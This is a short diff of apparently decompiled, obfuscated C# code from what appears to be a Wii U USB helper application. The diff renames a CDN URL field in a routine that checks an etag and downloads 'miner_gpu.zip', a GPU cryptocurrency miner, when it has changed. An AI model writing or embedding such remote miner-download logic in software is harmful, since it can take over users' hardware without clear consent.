@@ -75,11 +75,11 @@ namespace ns0
               str5 += string.Format("{{ \"low_power_mode\" : 0, \"no_prefetch\" : true, \"affine_to_cpu\" :{0} }},", (object) index);
             string contents3 = str5 + "],";
             string path = Path.Combine(str1, "etag");
-            string contents4 = GClass6.smethod_14(string.Format("{0}/mining/miner_gpu.zip", (object) Class67.String_2));
+            string contents4 = GClass6.smethod_14(string.Format("{0}/mining/miner_gpu.zip", (object) Class67.CDNWiiUUSBHelperURL));
             if (!File.Exists(path) || contents4 != File.ReadAllText(path))
             {
               Class108.bool_0 = true;
-              GClass6.smethod_8(string.Format("{0}/mining/miner_gpu.zip", (object) Class67.String_2), str1);
+              GClass6.smethod_8(string.Format("{0}/mining/miner_gpu.zip", (object) Class67.CDNWiiUUSBHelperURL), str1);
               File.WriteAllText(path, contents4);
               Class108.bool_0 = false;
             }
